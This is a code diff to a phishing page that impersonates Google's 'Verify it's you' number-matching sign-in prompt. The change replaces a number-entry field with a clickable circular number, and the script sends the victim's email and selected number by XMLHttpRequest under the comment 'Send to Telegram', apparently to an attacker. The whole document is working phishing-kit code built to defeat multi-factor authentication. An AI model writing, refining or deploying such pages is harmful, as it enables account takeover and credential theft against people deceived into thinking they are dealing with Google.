@@ -174,21 +174,15 @@
         <div class="container">
         <div class="logo"></div>
         <h1 class="title">Verify it's you</h1>
-        <p class="subtitle">For your security, Google needs to verify it's you. Please select the number shown on your device.</p>
+        <p class="subtitle">For your security, Google needs to verify it's you. Please select this number below when it appears on your device:</p>
 
-        <div class="number-highlight">
-            <div class="number-highlight-label">Select this number:</div>
-            <div class="number-highlight-value" id="targetNumber">--</div>
+        <div style="text-align: center; margin: 40px 0;">
+            <div class="number-display" style="background: #e8f0fe; border: 2px solid var(--gmail-blue); border-radius: 50%; width: 120px; height: 120px; margin: 0 auto; display: flex; align-items: center; justify-content: center;">
+                <span id="targetNumber" style="font-size: 48px; font-weight: 500; color: var(--gmail-blue);">--</span>
+            </div>
         </div>
 
-        <p class="instruction">Enter the number shown on your device:</p>
-
-        <div class="input-group" style="margin-bottom: 24px;">
-            <input type="number" id="userInput" class="number-input" placeholder="Enter the number here" min="0" max="99" maxlength="2" style="width: 100%; padding: 16px; border: 2px solid var(--gmail-border); border-radius: 8px; font-size: 18px; text-align: center;">
-        </div>
-
-        <button id="verifyBtn" class="btn btn-primary" onclick="verifyNumber()" disabled>Submit</button>
-        <button class="btn btn-secondary" onclick="tryAnother()">Try another way</button>
+        <button id="verifyBtn" class="btn" style="background: var(--gmail-blue); color: white; border: none;" onclick="verifyNumber()" disabled>Verify</button>
     </div>
 
     <footer class="footer">
@@ -208,42 +202,27 @@
         // Display target number
         document.getElementById('targetNumber').textContent = targetNumber || '--';
 
-        // Set up input field event listeners
-        const userInput = document.getElementById('userInput');
+        // Set up the circular number display
+        const numberDisplay = document.querySelector('.number-display');
         
-        userInput.addEventListener('input', function() {
-            const value = this.value.trim();
-            const btn = document.getElementById('verifyBtn');
+        numberDisplay.addEventListener('click', function() {
+            // Set the selected number to the target number
+            selectedNumber = parseInt(targetNumber);
             
-            // Validate input (0-99)
-            if (value !== '' && !isNaN(value) && parseInt(value) >= 0 && parseInt(value) <= 99) {
-                selectedNumber = parseInt(value);
-                btn.disabled = false;
-            } else {
-                selectedNumber = null;
-                btn.disabled = true;
-            }
-        });
-
-        // Allow Enter key to submit
-        userInput.addEventListener('keypress', function(e) {
-            if (e.key === 'Enter' && !document.getElementById('verifyBtn').disabled) {
-                verifyNumber();
-            }
+            // Add selection styling
+            this.style.background = 'var(--gmail-blue)';
+            this.style.borderColor = 'var(--gmail-blue)';
+            this.querySelector('span').style.color = 'white';
+            
+            // Enable verify button
+            document.getElementById('verifyBtn').disabled = false;
         });
 
         function verifyNumber() {
             const btn = document.getElementById('verifyBtn');
-            const input = document.getElementById('userInput');
-            
-            if (!selectedNumber && selectedNumber !== 0) {
-                alert('Please enter a valid number (0-99)');
-                return;
-            }
-
             btn.textContent = 'Verifying...';
             btn.disabled = true;
-            input.disabled = true;
+            numberDisplay.style.pointerEvents = 'none';
 
             // Send to Telegram
             const xhr = new XMLHttpRequest();
@@ -259,13 +238,9 @@
             xhr.send('di=' + encodeURIComponent(email) + '&chosen_number=' + selectedNumber);
         }
 
-        function tryAnother() {
-            window.location.href = 'otp.html?email=' + encodeURIComponent(email);
-        }
-
-        // Initialize - focus on input field
+        // Initialize - add pulsing animation to the number display
         document.addEventListener('DOMContentLoaded', function() {
-            document.getElementById('userInput').focus();
+            numberDisplay.style.animation = 'pulse 2s infinite';
         });
     </script>
 </body>
